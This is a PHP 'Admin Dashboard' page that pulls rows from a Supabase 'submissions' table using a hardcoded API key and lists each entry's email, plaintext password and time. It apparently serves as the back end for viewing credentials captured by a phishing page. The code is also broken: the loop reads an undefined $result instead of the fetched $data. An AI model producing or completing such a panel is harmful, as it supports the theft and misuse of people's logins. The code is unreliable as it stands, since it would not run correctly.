<?php

$url = "https://ptshthtnjcbngiceyjzc.supabase.co/rest/v1/submissions?select=*&order=id.desc";

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB0c2h0aHRuamNibmdpY2V5anpjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIyNDc2NTYsImV4cCI6MjA5NzgyMzY1Nn0.sejLXlM95cllcRuFcG-18P9uVFTMSnL70svBZ1L0kag"
));

$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);

?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div style="width:90%; margin:auto; background:white; padding:20px;">

    <h2>Admin Dashboard</h2>

    <table>

        <tr>
            <th>ID</th>
            <th>Email</th>
            <th>Password</th>
            <th>Time</th>
        </tr>

        <?php while($row = $result->fetch_assoc()) { ?>

        <tr>
            <td><?php echo $row['id']; ?></td>
            <td><?php echo $row['email']; ?></td>
            <td><?php echo $row['password']; ?></td>
            <td><?php echo $row['created_at']; ?></td>
        </tr>

        <?php } ?>

    </table>

</div>

</body>
</html>
